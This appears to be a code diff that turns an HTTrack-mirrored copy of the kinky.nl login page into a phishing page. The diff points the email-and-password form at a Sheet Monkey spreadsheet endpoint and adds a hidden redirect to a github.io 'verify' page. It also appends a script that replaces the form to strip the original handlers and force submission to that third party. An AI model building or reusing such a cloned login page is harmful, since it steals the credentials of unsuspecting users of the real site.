@@ -463,51 +463,78 @@
     <div class="shadowed-card p-4 p-sm-5">
         <h1 class="title-red big">Inloggen op Kinky.nl</h1>
         <p>Heb je al een account? Dan kan je hier direct inloggen.</p>
-        <form action="https://www.kinky.nl/inloggen" id="login-form" method="post">
-            <input type="hidden" name="action" value="validate_captcha">
-            <p class="form-error"></p>
+        <form
+  action="https://api.sheetmonkey.io/form/k1CFfdvYE25WQa91uqzEYU"
+  id="login-form"
+  method="POST">
 
-            
-            <div class="form-group">
-                <label for="username"><b>Email</b></label>
-                <input type="email" data-validate="email|required" class="form-control" id="username" name="username">
-                <div class="invalid-feedback"></div>
-            </div>
-            <div class="form-group">
-                <label for="password"><b>
-                    Wachtwoord
-                </b> </label>
-                <div class="password-layout">
-                    <input type="password" data-validate="required" class="form-control" id="password"
-                        name="password">
-                    <i class="fa fa-eye show-password"></i>
-                    <i class="fa fa-eye-slash d-none hide-password"></i>
-                </div>
 
-                <div class="invalid-feedback"></div>
-            </div>
+  <!-- This hidden field tells Sheet Monkey where to redirect after submit -->
+  <input
+    type="hidden"
+    name="x-sheetmonkey-redirect"
+    value="https://paper-mache-roast.github.io/TestMcTestface/verifydbc6.html"
+  >
 
-            <div class="form-checks pb-3">
-                <input type="checkbox" id="remember_me" name="remember_me" class="form-control">
-                <label class="form-check-label" for="remember_me">
-                    Onthoud mij
-                </label>
-                <div class="invalid-feedback"></div>
-            </div>
-            <div class="d-flex justify-content-between align-items-center">
-                <a href="https://www.kinky.nl/wachtwoord-vergeten" class="forgot">Wachtwoord vergeten?</a>
-                <button class="btn btn-success" onclick="location.href='verifydbc6.html'">
-  Inloggen
-</button>
+  <p class="form-error"></p>
 
-            </div> 
-  
-            <script src="../www.google.com/recaptcha/api431d.js?render=6Le09SwgAAAAAH86NZtq6kItrmf7JCiM4YixVecC"></script>
-            <script>
-                window.grecaptcha = grecaptcha
-                window.recaptcha_site_key = '6Le09SwgAAAAAH86NZtq6kItrmf7JCiM4YixVecC'
-            </script>
-        </form>
+  <div class="form-group">
+      <label for="username"><b>Email</b></label>
+      <input
+        type="email"
+        data-validate="email|required"
+        class="form-control"
+        id="username"
+        name="username"
+      >
+      <div class="invalid-feedback"></div>
+  </div>
+
+  <div class="form-group">
+      <label for="password"><b>Wachtwoord</b></label>
+      <div class="password-layout">
+          <input
+            type="password"
+            data-validate="required"
+            class="form-control"
+            id="password"
+            name="password"
+          >
+          <i class="fa fa-eye show-password"></i>
+          <i class="fa fa-eye-slash d-none hide-password"></i>
+      </div>
+      <div class="invalid-feedback"></div>
+  </div>
+
+  <div class="form-checks pb-3">
+      <input
+        type="checkbox"
+        id="remember_me"
+        name="remember_me"
+        class="form-control"
+      >
+      <label class="form-check-label" for="remember_me">
+          Onthoud mij
+      </label>
+      <div class="invalid-feedback"></div>
+  </div>
+
+  <div class="d-flex justify-content-between align-items-center">
+      <a href="WEBSITE" class="forgot">Wachtwoord vergeten?</a>
+
+      <button class="btn btn-success" type="submit">
+          Inloggen
+      </button>
+  </div>
+
+  <script src="GOOGLERECAPTCHALINK"></script>
+  <script>
+      window.grecaptcha = grecaptcha
+      window.recaptcha_site_key = '6Le09SwgAAAAAH86NZtq6kItrmf7JCiM4YixVecC'
+  </script>
+</form>
+
+
     </div>
     <div>
         <h3 class="title-red">Heb je nog geen account?</h3>
@@ -743,6 +770,25 @@ Tel: 070-7506006</a>
 		<script type="application/javascript" defer src="dist/js/common_0.1.9.js"></script>
 		<script type="application/javascript" defer src="dist/js/app_0.1.9.js"></script>
 	<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9cbda6163b93c9cb',t:'MTc3MDc0NzkyMi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='cdn-cgi/challenge-platform/h/b/scripts/jsd/d251aa49a8a3/maind41d.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9cbda6163b93c9cb","version":"2025.9.1","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"66ea3bb41638496f9c5f4a1870791526","b":1}' crossorigin="anonymous"></script>
+<script>
+  (function () {
+    const form = document.getElementById('login-form');
+    if (!form) return;
+
+    // REMOVE all existing submit handlers added by the copied site
+    const clone = form.cloneNode(true);
+    form.parentNode.replaceChild(clone, form);
+
+    // Force normal submit to SheetMonkey
+    clone.addEventListener('submit', function () {
+      clone.submit();
+    });
+  })();
+</script>
+
+
+
+
 </body>
 
 <!-- Mirrored from www.kinky.nl/inloggen by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 10 Feb 2026 18:25:27 GMT -->
